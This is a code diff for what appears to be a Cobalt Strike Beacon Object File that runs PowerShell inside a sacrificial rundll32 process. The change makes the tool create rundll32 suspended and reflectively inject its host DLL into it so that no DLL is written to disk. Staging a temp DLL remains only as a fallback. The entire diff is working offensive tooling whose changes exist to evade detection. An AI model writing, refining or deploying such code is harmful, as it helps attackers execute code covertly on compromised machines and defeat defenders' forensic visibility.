@@ -290,6 +290,7 @@ static BOOL PpfCreateSacrificial(
     BOOL useImpersonate,
     wchar_t* loaderW,
     wchar_t* cmdW,
+    DWORD creationFlags,
     LPSTARTUPINFOW si,
     LPPROCESS_INFORMATION pi)
 {
@@ -306,7 +307,7 @@ static BOOL PpfCreateSacrificial(
             NULL,
             NULL,
             FALSE,
-            CREATE_NO_WINDOW,
+            creationFlags,
             NULL,
             NULL,
             si,
@@ -352,7 +353,7 @@ static BOOL PpfCreateSacrificial(
         0,
         loaderW,
         cmdW,
-        CREATE_NO_WINDOW,
+        creationFlags,
         NULL,
         NULL,
         si,
@@ -366,7 +367,7 @@ static BOOL PpfCreateSacrificial(
             NULL,
             NULL,
             FALSE,
-            CREATE_NO_WINDOW,
+            creationFlags,
             NULL,
             NULL,
             si,
@@ -385,6 +386,8 @@ static BOOL PpfCreateSacrificial(
     KERNEL32$CloseHandle(hThreadToken);
     return ok;
 }
+
+#include "powerpick_fork_reflect.h"
 
 typedef struct _PPF_IMPORT_BLOB {
     DWORD length;
@@ -801,12 +804,6 @@ void go(IN PCHAR buffer, IN ULONG blength)
         }
     }
 
-    if (!WriteTempDll(hostDll, hostDllLen, dllPath, sizeof(dllPath), useImpersonate)) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to stage host DLL (err=%lu)", KERNEL32$GetLastError());
-        goto cleanup;
-    }
-    wroteDll = TRUE;
-
     cmdA = (char*)intAlloc(1024);
     cmdW = (wchar_t*)intAlloc(1024 * sizeof(wchar_t));
     if (!cmdA || !cmdW) {
@@ -814,23 +811,75 @@ void go(IN PCHAR buffer, IN ULONG blength)
         goto cleanup;
     }
 
-    MSVCRT$_snprintf(
-        cmdA,
-        1024,
-        "\"%s\" \"%s\",PowerPickForkRun %s",
-        loader,
-        dllPath,
-        mapName);
+    if (!AsciiToWide(loader, loaderW, MAX_PATH)) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert spawnto path");
+        goto cleanup;
+    }
 
-    if (!AsciiToWide(loader, loaderW, MAX_PATH) || !AsciiToWide(cmdA, cmdW, 1024)) {
+    /* Prefer reflective host map into suspended rundll32 (no host DLL on disk). */
+    MSVCRT$_snprintf(cmdA, 1024, "\"%s\"", loader);
+    if (!AsciiToWide(cmdA, cmdW, 1024)) {
         BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert rundll32 command line");
         goto cleanup;
     }
 
-    if (!PpfCreateSacrificial(useImpersonate, loaderW, cmdW, &si, &pi)) {
-        goto cleanup;
+    if (PpfCreateSacrificial(
+            useImpersonate,
+            loaderW,
+            cmdW,
+            CREATE_NO_WINDOW | CREATE_SUSPENDED,
+            &si,
+            &pi)) {
+        createdProcess = TRUE;
+        if (!PpfReflectHostDll(pi.hProcess, hostDll, hostDllLen, mapName)) {
+            KERNEL32$TerminateProcess(pi.hProcess, 1);
+            if (pi.hThread) {
+                KERNEL32$CloseHandle(pi.hThread);
+                pi.hThread = NULL;
+            }
+            if (pi.hProcess) {
+                KERNEL32$CloseHandle(pi.hProcess);
+                pi.hProcess = NULL;
+            }
+            createdProcess = FALSE;
+        }
+        /* Reflective thread runs the host; leave primary thread suspended. */
     }
-    createdProcess = TRUE;
+
+    if (!createdProcess) {
+        /* Fallback: stage host DLL + classic rundll32 export entry. */
+        if (!WriteTempDll(
+                hostDll, hostDllLen, dllPath, sizeof(dllPath), useImpersonate)) {
+            BeaconPrintf(
+                CALLBACK_ERROR,
+                "[!] Reflective host load failed and temp DLL stage failed (err=%lu)",
+                KERNEL32$GetLastError());
+            goto cleanup;
+        }
+        wroteDll = TRUE;
+
+        MSVCRT$_snprintf(
+            cmdA,
+            1024,
+            "\"%s\" \"%s\",PowerPickForkRun %s",
+            loader,
+            dllPath,
+            mapName);
+        if (!AsciiToWide(cmdA, cmdW, 1024)) {
+            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert rundll32 command line");
+            goto cleanup;
+        }
+        if (!PpfCreateSacrificial(
+                useImpersonate,
+                loaderW,
+                cmdW,
+                CREATE_NO_WINDOW,
+                &si,
+                &pi)) {
+            goto cleanup;
+        }
+        createdProcess = TRUE;
+    }
 
     wait = KERNEL32$WaitForSingleObject(pi.hProcess, PPF_WAIT_MS);
     if (wait == WAIT_TIMEOUT) {
